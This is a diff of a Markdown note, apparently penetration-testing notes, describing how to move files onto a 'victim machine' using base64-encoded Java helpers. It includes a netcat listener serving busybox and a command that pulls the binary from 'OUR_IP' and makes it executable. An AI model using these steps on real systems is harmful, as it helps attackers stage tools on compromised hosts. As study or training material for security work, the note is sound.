@@ -1,40 +1,40 @@
 ## File transfer with Java
 
-#### 1) Generate 
+#### 1) Encode the socket client as Base64
 
     base64 SocketClient.java
 
-#### 2) 
+#### 2) Transfer the file by decoding the Base64 on the victim machine
 
-    echo "BASE64ENCODED" | base64 -d > SocketClient.java (Victim machine)
+    echo "BASE64ENCODED" | base64 -d > SocketClient.java 
 
-#### 3) 
+#### 3) Compile
 
     javac SocketClient.java 
 
-#### 4) 
+#### 4) Same steps with File Permissions
 
     base64 FilePermissions.java
 
-#### 5)  
+#### 5)  Transfer to the victim machine
 
-    echo "BASE64ENCODED" | base64 -d > FilePermissions.java (Victim machine)
+    echo "BASE64ENCODED" | base64 -d > FilePermissions.java 
 
-#### 6) 
+#### 6) Compile
 
     javac FilePermissions.java
 
-#### 7) 
+#### 7) Transfer busybox (example)
 
     nc -lvnp 5555 < busybox
 
-#### 8) 
+#### 8) Run the socket client from the victim machine to retrieve the binary from the attacker machine
 
-    java SocketClient OUR_IP 5555 > busybox (Victim machine)
+    java SocketClient OUR_IP 5555 > busybox 
 
-#### 9) 
+#### 9) Give busybox permissions to execute
 
-    java FilePermissions (Give busybox permissions to execute)
+    java FilePermissions 
 
 ## Java Files
 
